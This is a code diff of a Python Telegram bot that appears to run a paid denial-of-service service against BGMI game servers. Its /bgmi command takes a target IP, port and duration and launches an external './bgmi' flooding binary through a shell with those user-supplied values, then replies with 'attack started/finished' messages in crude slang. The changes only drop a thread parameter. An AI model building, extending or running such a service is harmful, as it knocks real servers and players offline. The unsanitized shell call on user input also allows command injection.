@@ -189,15 +189,15 @@ def handle_bgmi(message):
                     response = "⚠️𝐄𝐑𝐑𝐎𝐑:240 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
                 else: 
                     record_command_logs(user_id, '/bgmi', target, port, time)
-                    log_command(user_id, target, port, time, thread)
-                    start_attack_reply(message, target, port, time, thread )
+                    log_command(user_id, target, port, time)
+                    start_attack_reply(message, target, port, time)
                     full_command = f"./bgmi {target} {port} {time}"
                     subprocess.run(full_command, shell=True)
                     response = f"𝐂𝐇𝐔𝐃𝐀𝐈 FINISHED 🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
             except ValueError:
                 response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
         else:
-            response = "𝑼𝑺𝑬 :- /𝖇𝖌𝖒𝖎  <𝐓𝐀𝐑𝐆𝐄𝐓>  <𝐏𝐎𝐑𝐓>  <𝐓𝐈𝐌𝐄> THREAD\n𝓑𝓨 👑"
+            response = "𝑼𝑺𝑬 :- /𝖇𝖌𝖒𝖎  <𝐓𝐀𝐑𝐆𝐄𝐓>  <𝐏𝐎𝐑𝐓>  <𝐓𝐈𝐌𝐄>\n𝓑𝓨 👑"
     else:
         response = "💢 Oɴʟʏ Pᴀɪᴅ Mᴇᴍʙᴇʀs Cᴀɴ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢 DM  to 🗝️"
 
@@ -206,7 +206,7 @@ def handle_bgmi(message):
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝗧𝗔𝗥𝗚𝗘𝗧: {target}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦n𝗧𝗜𝗠𝗘:\n {thread} THREAD \n𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥: 𝗕𝗚𝗠𝗜\n𝙾𝚆𝙽𝙴𝚁 🚀"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝗧𝗔𝗥𝗚𝗘𝗧: {target}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥: 𝗕𝗚𝗠𝗜\n𝙾𝚆𝙽𝙴𝚁 🚀"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['clearlogs'])
@@ -397,4 +397,3 @@ if __name__ == "__main__":
             print(e)
             # Add a small delay to avoid rapid looping in case of persistent errors
             time.sleep(15)
-    
